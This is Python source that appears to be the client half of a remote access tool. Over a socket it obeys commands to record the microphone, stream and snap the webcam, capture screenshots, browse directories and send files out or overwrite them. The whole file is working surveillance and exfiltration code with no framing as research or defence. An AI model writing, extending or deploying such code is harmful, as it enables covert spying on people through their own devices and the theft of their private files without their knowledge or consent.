import socket
import pyaudio
import cv2
from json import dumps, loads
from numpy import array
from pyautogui import screenshot
from time import sleep
from os import listdir, chdir, path


def rec_sound(conn: socket.socket) -> None:
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = int(conn.recv(1024).decode())
    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
    frames = []
    for _ in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    conn.send(str(p.get_sample_size(sample_format)).encode())
    sleep(0.25)
    for itm in frames:
        conn.send(itm)


def live(conn: socket.socket) -> None:
    vid = cv2.VideoCapture(0)
    while True:
        ret, frame = vid.read()
        if not ret:
            break
        rgb_list = frame.tolist()
        dmps = dumps(rgb_list)
        conn.sendall(dmps.encode())
        conn.send(b"END")
        flag = conn.recv(1024).decode()
        if flag == "end":
            break
        sleep(0.25)


def take_scr(conn: socket.socket) -> None:
    scr = screenshot()
    arr = array(scr)
    rgb_list = arr.tolist()
    dmps = dumps(rgb_list)
    conn.send(dmps.encode())


def get_pic(conn: socket.socket) -> None:
    vid = cv2.VideoCapture(0)
    ret, frame = vid.read()
    if ret:
        rgb_list = frame.tolist()
        dmps = dumps(rgb_list)
        conn.send(dmps.encode())


def dir_exp(conn: socket.socket, command: str) -> None:
    if command.startswith("FXshf:"):
        fds = ""
        srh_file = command.split(":", 1)[1]
        for fd in listdir():
            if srh_file in fd:
                if path.isdir(fd):
                    fds += "D:"
                else:
                    fds += "F:"
                fds += fd + "\n"
        sleep(0.5)
        conn.send(fds.encode())
    elif command.startswith("FXchd:"):
        new_path = command.split(":", 1)[1]
        try:
            chdir(new_path)
            sleep(0.5)
            conn.send(b" Done !")
        except FileNotFoundError:
            sleep(0.5)
            conn.send(b"The path entered is incorrect !")
    elif command.startswith("FXdwn:") or command.startswith("4FXdwn:"):
        file_path = command.split(":", 1)[1]
        buffer = 4096
        try:
            if path.isfile(file_path):
                file_size = path.getsize(file_path)
                if command.startswith("FXdwn:"):
                    conn.send(str(file_size).encode())
                with open(file_path, "rb") as b_file:
                    while True:
                        rdata = b_file.read(buffer)
                        if not rdata:
                            break
                        conn.sendall(rdata)
                if command.startswith("4FXdwn:"):
                    with open(file_path, "wb") as f:
                        while True:
                            data = conn.recv(buffer)
                            if "END" in str(data[-3:]):
                                f.write(data[:-3])
                                break
                            if not data:
                                break
                            f.write(data)
            else:
                return
        except FileNotFoundError:
            conn.send(b"The path entered is incorrect !")
            return


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    while True:
        sleep(0.25)
        if command == "Tpict":
            get_pic(conn)
            conn.send(b"END")
            break
        elif command == "Rsound":
            rec_sound(conn)
            conn.send(b"END")
            break
        elif command == "Glive":
            live(conn)
            conn.send(b"END")
            break
        elif command == "Tscr":
            take_scr(conn)
            conn.send(b"END")
            break
        elif command.startswith("FX") or command.startswith("4FX"):
            dir_exp(conn, command)
            conn.send(b"END")
            break
        else:
            break